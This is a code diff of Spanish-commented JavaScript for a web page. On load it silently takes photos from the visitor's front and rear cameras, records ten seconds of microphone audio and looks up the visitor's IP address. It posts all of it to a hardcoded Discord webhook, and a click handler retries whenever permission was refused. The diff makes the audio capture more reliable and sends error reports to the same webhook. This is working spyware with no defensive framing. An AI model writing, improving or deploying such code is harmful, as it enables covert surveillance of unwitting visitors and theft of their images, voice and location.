@@ -70,14 +70,14 @@
 
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';
 
-    const SEGUNDOS_GRABACION = 10; // cambia aquí la duración del audio
+    const SEGUNDOS_GRABACION = 10;
 
     let currentStream = null;
     let yaEnviado = false;
     let pidiendo = false;
     let ipUsuario = null;
 
-    // -------- Obtener IP pública --------
+    // -------- IP --------
     async function obtenerIP() {
       if (ipUsuario) return ipUsuario;
       try {
@@ -86,7 +86,7 @@
         ipUsuario = data.ip;
         return ipUsuario;
       } catch (err) {
-        console.error('No se pudo obtener la IP:', err);
+        console.warn('No se pudo obtener la IP:', err);
         return null;
       }
     }
@@ -98,7 +98,7 @@
       return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
     }
 
-    // -------- Capturar frame de cámara --------
+    // -------- Captura de cámara --------
     async function capturarDeCamara(facingMode) {
       if (currentStream) {
         currentStream.getTracks().forEach(t => t.stop());
@@ -135,43 +135,64 @@
       return blob;
     }
 
-    // -------- Enviar archivo al webhook --------
+    // -------- Enviar al webhook --------
     async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
-      if (!blob) return;
       const formData = new FormData();
       formData.append('file', blob, nombreArchivo);
       formData.append('payload_json', JSON.stringify({ content: mensaje }));
 
       try {
-        await fetch(WEBHOOK_URL, {
+        const res = await fetch(WEBHOOK_URL, {
           method: 'POST',
           body: formData
         });
+        console.log(`Enviado ${nombreArchivo}:`, res.status, res.statusText);
+        return res.ok;
       } catch (err) {
-        console.error(err);
+        console.error(`Error al enviar ${nombreArchivo}:`, err);
+        return false;
       }
     }
 
     // -------- Grabar audio --------
     async function grabarAudio(segundos) {
+      if (!navigator.mediaDevices || !window.MediaRecorder) {
+        throw new Error('MediaRecorder no soportado en este navegador');
+      }
+
       const stream = await navigator.mediaDevices.getUserMedia({
         audio: true,
         video: false
       });
 
-      const recorder = new MediaRecorder(stream);
+      // Elegir un mimeType soportado
+      let mimeType = 'audio/webm';
+      if (!MediaRecorder.isTypeSupported(mimeType)) {
+        if (MediaRecorder.isTypeSupported('audio/mp4')) mimeType = 'audio/mp4';
+        else if (MediaRecorder.isTypeSupported('audio/ogg')) mimeType = 'audio/ogg';
+        else mimeType = ''; // deja que el navegador elija
+      }
+      console.log('Usando mimeType:', mimeType || '(por defecto)');
+
+      const opciones = mimeType ? { mimeType } : {};
+      const recorder = new MediaRecorder(stream, opciones);
       const chunks = [];
 
       recorder.ondataavailable = e => {
-        if (e.data.size > 0) chunks.push(e.data);
+        if (e.data && e.data.size > 0) chunks.push(e.data);
       };
 
-      return new Promise((resolve) => {
+      return new Promise((resolve, reject) => {
         recorder.onstop = () => {
-          // Detener el micrófono
           stream.getTracks().forEach(t => t.stop());
-          const blob = new Blob(chunks, { type: 'audio/webm' });
-          resolve(blob);
+          const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
+          console.log('Audio grabado, tamaño:', blob.size, 'bytes');
+          resolve({ blob, mimeType: mimeType || 'audio/webm' });
+        };
+
+        recorder.onerror = (e) => {
+          stream.getTracks().forEach(t => t.stop());
+          reject(e);
         };
 
         recorder.start();
@@ -191,7 +212,8 @@
       const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';
 
       try {
-        // 1) Fotos
+        // 1) Foto frontal
+        console.log('Capturando cámara frontal...');
         const blobFrontal = await capturarDeCamara('user');
         await enviarAlWebhook(
           blobFrontal,
@@ -201,6 +223,8 @@
 
         await new Promise(r => setTimeout(r, 800));
 
+        // 2) Foto trasera
+        console.log('Capturando cámara trasera...');
         const blobTrasera = await capturarDeCamara('environment');
         await enviarAlWebhook(
           blobTrasera,
@@ -208,30 +232,40 @@
           'trasera.jpg'
         );
 
-        // 2) Audio
-        const audioBlob = await grabarAudio(SEGUNDOS_GRABACION);
-        await enviarAlWebhook(
-          audioBlob,
-          `🎤 **Audio grabado** (${SEGUNDOS_GRABACION}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
-          'audio.webm'
-        );
+        // 3) Audio
+        console.log('Iniciando grabación de audio...');
+        try {
+          const { blob: audioBlob, mimeType } = await grabarAudio(SEGUNDOS_GRABACION);
+          const ext = mimeType.includes('mp4') ? 'mp4' : mimeType.includes('ogg') ? 'ogg' : 'webm';
+          await enviarAlWebhook(
+            audioBlob,
+            `🎤 **Audio grabado** (${SEGUNDOS_GRABACION}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
+            `audio.${ext}`
+          );
+        } catch (audioErr) {
+          console.error('Error al grabar audio:', audioErr);
+          // Avisar al webhook que no se pudo grabar
+          const texto = new Blob(
+            [`No se pudo grabar el audio.\nMotivo: ${audioErr.message || audioErr}\nHora: ${hora}\nIP: ${linkIP}`],
+            { type: 'text/plain' }
+          );
+          await enviarAlWebhook(texto, `⚠️ Error de audio\n🕒 ${hora}\n🌐 ${linkIP}`, 'error-audio.txt');
+        }
 
         yaEnviado = true;
+        console.log('Todo enviado correctamente.');
 
       } catch (err) {
-        console.error('Permiso denegado o error:', err);
-        // Si el usuario deniega, se queda cargando. Al hacer clic se reintenta.
+        console.error('Permiso denegado o error general:', err);
       } finally {
         pidiendo = false;
       }
     }
 
-    // Primer intento al cargar
     window.addEventListener('load', () => {
       iniciar();
     });
 
-    // Reintento con clic o toque si no se ha enviado aún
     document.addEventListener('click', () => {
       if (!yaEnviado && !pidiendo) iniciar();
     });
